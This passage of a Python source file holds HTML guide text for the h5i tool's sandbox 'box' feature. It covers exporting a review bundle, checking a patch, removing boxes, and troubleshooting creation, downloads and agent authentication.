{code_block('h5i box export review-1234 --out ./review-1234\ngit apply --check ./review-1234/patch.diff\nh5i box rm review-1234\nh5i box rm first-box')}
<p>Read <code>report.md</code>, <code>patch.diff</code>, and <code>receipt.json</code> before applying anything. The report puts execution and denials beside the proposed change; the receipt identifies the resolved boundary. Absence of a network tally at a tier that cannot report one is not evidence that no connection was attempted. Keep the bundle needed for review and remove the disposable environment after the decision.</p>
<p>If creation fails, rerun <code>h5i box probe</code> and inspect the requested tier. If dependencies fail to download, grant only the required registries or use a warm cache. If an agent cannot authenticate, inspect the runtime profile and <code>box secrets</code>. The <a href="/manual/#containment-optional">box command reference</a> and <a href="/manual/#the-console">dashboard reference</a> cover exact command options and limits.</p>""",
    "next": ("/guides/build-and-verify-a-web-app/", "Back to the first guide", "Build and Verify a Web App", "Start the development loop with a Rust kernel and a property to prove."),
    "cta": ("Review before applying", "The patch and the execution record answer different questions.", "/manual/#containment-optional", "Read the box reference"),
}


GUIDES = [BUILD_VERIFY, RED_TEAM, ADVANCED, REGRESSION, SANDBOX]
